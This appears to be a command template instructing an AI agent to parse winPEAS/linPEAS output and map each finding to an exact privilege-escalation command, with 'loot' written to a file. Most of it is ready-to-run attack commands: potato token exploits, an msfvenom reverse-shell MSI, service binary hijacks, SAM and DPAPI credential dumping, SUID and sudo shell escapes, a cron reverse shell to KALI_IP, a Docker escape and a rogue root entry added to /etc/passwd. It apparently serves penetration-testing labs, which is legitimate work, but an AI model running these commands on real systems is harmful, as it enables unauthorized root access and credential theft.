Parse winPEAS or linPEAS output from $ARGUMENTS (file path or pasted output). Extract critical/high findings by color code and map each finding to the exact exploitation command. Never reproduce unfiltered PEAS output in context.

## Step 1: Load input (token-efficient)
If $ARGUMENTS is a file path, extract only critical lines:
```bash
grep -E '(\[!!\]|\[\+\]|99%|95%|Interesting|SeImpersonate|SeAssignPrimary|SeBackup|SeRestore|SeTakeOwnership|SeDebug|AlwaysInstallElevated|Unquoted|DPAPI|SAM|SYSTEM|AutoRun|cred|password|token|secret|flag|Administrators|RDP|WinRM|UsoSvc|wuauserv|seclogon|cap_setuid|SUID|sudo|docker|lxd|no_root_squash|writable|PATH hijack)' <FILE> | head -100
```
For pasted input: analyze directly.

## Step 2: Color code severity
- `[!!]` RED = Critical — exploit immediately
- `[+]` YELLOW = High — strong privesc candidate
- No marker = Info — skip unless very specific

## Step 3: Windows findings → exploitation commands

**SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege:**
```powershell
.\PrintSpoofer.exe -i -c cmd           # Server 2019 / Win10
.\GodPotato.exe -cmd "cmd /c whoami"  # Modern systems
.\JuicyPotatoNG.exe -t * -p cmd.exe   # Older systems
```

**AlwaysInstallElevated = 1 (both HKLM and HKCU must be 1):**
```bash
# Kali: generate MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f msi -o priv.msi
# Target:
msiexec /quiet /qn /i C:\Windows\Temp\priv.msi
```

**Unquoted Service Path:**
```powershell
sc qc <ServiceName>   # confirm path has spaces, no quotes
# Drop payload at first space: e.g. C:\Program Files\App\svc.exe → C:\Program.exe
copy shell.exe "C:\Program.exe"
sc stop <ServiceName> && sc start <ServiceName>
```

**Writable Service Binary:**
```powershell
copy /Y shell.exe "C:\path\to\service.exe"
sc stop <ServiceName> && sc start <ServiceName>
```

**SAM/SYSTEM readable:**
```bash
# Copy off target, dump on Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**DPAPI credentials:**
```powershell
dpapi::cred /in:"C:\Users\user\AppData\Roaming\Microsoft\Credentials\<GUID>"
dpapi::masterkey /in:"C:\Users\user\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>" /rpc
```

## Step 4: Linux findings → exploitation commands

**SUID binary** (check GTFObins: gtfobins.github.io):
```bash
find / -perm -4000 -type f 2>/dev/null
# python3: python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
# find:    find . -exec /bin/bash -p \; -quit
# vim:     vim -c ':!/bin/bash'
# cp:      cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p
```

**Sudo NOPASSWD** (check GTFObins #+sudo):
```bash
sudo vim -c ':!/bin/bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo find . -exec /bin/bash \; -quit
sudo awk 'BEGIN {system("/bin/bash")}'
sudo env /bin/bash
sudo less /etc/passwd   # then: !/bin/bash
```

**Capability cap_setuid:**
```bash
getcap -r / 2>/dev/null
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX; setuid(0); exec "/bin/bash";'
```

**Writable cron job:**
```bash
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /path/to/cron.sh
```

**NFS no_root_squash:**
```bash
# Kali:
mount -t nfs <TARGET>:/share /mnt/nfs -o nolock
cp /bin/bash /mnt/nfs/rootbash; chmod +s /mnt/nfs/rootbash
# Target:
/mnt/share/rootbash -p
```

**Docker group:**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**Writable /etc/passwd:**
```bash
openssl passwd -1 -salt hack hacked123
echo 'hacker:$1$hack$<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker   # password: hacked123
```

## Step 5: Output format
```
=== PEAS TRIAGE: <Windows|Linux> | <hostname> ===
[CRITICAL - exploit now]
  Finding: <name>
  Command: <exact one-liner>

[HIGH - strong candidate]
  Finding: <name>
  Command: <exact one-liner>

PRIORITY ORDER: <ordered list — what to try first>
```
Write to ~/osai/loot/<hostname>_privesc.md
